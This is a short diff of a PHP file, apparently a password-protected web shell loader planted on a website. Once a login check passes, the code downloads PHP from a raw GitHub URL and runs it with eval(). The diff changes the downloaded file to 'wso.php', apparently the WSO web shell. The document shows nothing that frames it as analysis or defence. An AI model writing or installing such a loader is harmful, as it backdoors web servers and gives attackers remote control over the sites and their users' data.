@@ -66,7 +66,7 @@ if (isset($_POST["password"])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo("https://raw.githubusercontent.com/kembarbaru120000/213/refs/heads/main/curl2.php");
+    $a = geturlsinfo("https://raw.githubusercontent.com/kembarbaru120000/213/refs/heads/main/wso.php");
     eval("?>" . $a);
 } else {
     ?>
